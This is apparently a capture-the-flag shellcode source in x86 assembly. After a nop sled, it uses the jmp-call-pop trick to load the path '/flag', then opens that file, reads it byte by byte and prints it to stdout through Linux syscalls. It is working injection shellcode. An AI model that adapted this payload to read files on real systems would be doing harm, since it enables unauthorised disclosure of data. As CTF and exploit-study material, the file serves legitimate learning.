	nop
	nop
	nop
	nop

.global main
main:
	jmp	loadpath

openfile:
	pop	%ebx

	/* open the flag file */
	xor	%ecx, %ecx
	xor	%eax, %eax
	movb	$5, %al		/* sys_open */
	int	$0x80

	/* store off the returned fd */
	movl	%eax, %edi

	/* setup the 3rd and 4th args, they don't change */
	xor	%edx, %edx
	inc	%edx		/* only 1 byte at a time */
	push	%eax		/* allocate 4 bytes off stack and */
	movl	%esp, %ecx	/* use it as our read/write buffer */

	jmp	read

write:
	/* write 1 byte to stdout */
	xor	%ebx, %ebx
	inc	%ebx		/* stdout */
	xor	%eax, %eax
	movb	$4, %al		/* sys_write */
	int	$0x80

read:
	/* read 1 byte from the file */
	movl	%edi, %ebx	/* fd for open /flag */
	xor	%eax, %eax
	movb	$3, %al		/* sys_read */
	int	$0x80

	/* jump to write if 1 byte was read */
	dec	%eax
	jz	write

done:
	pop	%eax

	xor	%ebx, %ebx
	xor	%eax, %eax
	movb	$1, %al		/* sys_exit */
	int	$0x80

loadpath:
	call	openfile
	.asciz	"/flag"		/* NUL-terminator at end of shellcode */
